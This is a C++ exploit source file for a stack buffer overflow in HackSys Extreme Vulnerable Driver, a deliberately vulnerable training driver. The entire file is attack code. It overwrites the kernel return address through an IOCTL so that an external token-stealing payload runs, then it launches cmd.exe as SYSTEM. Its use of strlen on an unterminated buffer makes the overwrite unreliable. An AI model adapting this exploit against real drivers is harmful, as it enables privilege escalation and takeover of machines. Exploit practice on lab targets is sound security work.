#include <stdio.h>
#include <Windows.h>

// Using an external function at runtime so the payload can be written in masm and
// directly incorporated into the exploit without need for a shellcode string
extern "C" void __stdcall payload(void);

int main()
{
	// Main variables for the exploit
	HANDLE driver;
	DWORD bytes_returned;
	int IOCTL_opcode = 0x222003;
	int rip_offset = 2072;
	uintptr_t payloadAddy = (uintptr_t)payload;
	const char* driverPath = "\\\\.\\HackSysExtremeVulnerableDriver";
	char out[64];
	char* data;

	printf("HEVD Stack Overflow x64 Exploit");

	printf("[*] Payload function at %p\n", payload);

	printf("Press enter to continue\n");
	getchar();

	// Open a handle to HEVD
	driver = CreateFileA(driverPath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d when opening handle to driver\n", GetLastError());
		return 0;
	}

	printf("[+] Opended handle to driver %p\n", driver);

	// Allocate memory on the heap for our payload
	data = (char*)malloc(3000);
	if (data == 0)
	{
		printf("[-] Error %d when allocating memory for payload\n", GetLastError());
		CloseHandle(driver);
		return 0;
	}
	
	// Setup our payload to overflow the return address with the address of our payload function
	memset(data, '\x41', rip_offset);
	memcpy(data + strlen(data), &payloadAddy, sizeof(uintptr_t));
	
	printf("[*] Sending payload to driver\n");


	// Send the vulnerable IOCTL code to trigger the exploit
	if (!DeviceIoControl(driver, IOCTL_opcode, data, rip_offset + sizeof(uintptr_t), out, 64, &bytes_returned, 0))
	{
		printf("[-] Error %d when sending IOCTL code to driver\n", GetLastError());
		free(data);
		CloseHandle(driver);
		return 0;
	}

	printf("[+] Payload sent to driver!\n");

	// Cleanup our data heap and driver handle since we don't need them now
	free(data);
	CloseHandle(driver);

	printf("Token changed to system, opening shell!");

	// Launch an instance of cmd.exe with our new system security token!
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	memset(&startInfo, 0, sizeof(STARTUPINFOA));

	startInfo.cb = sizeof(STARTUPINFOA);
	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d when starting shell\n", GetLastError());
	}
	else
	{
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}

	return 0;
}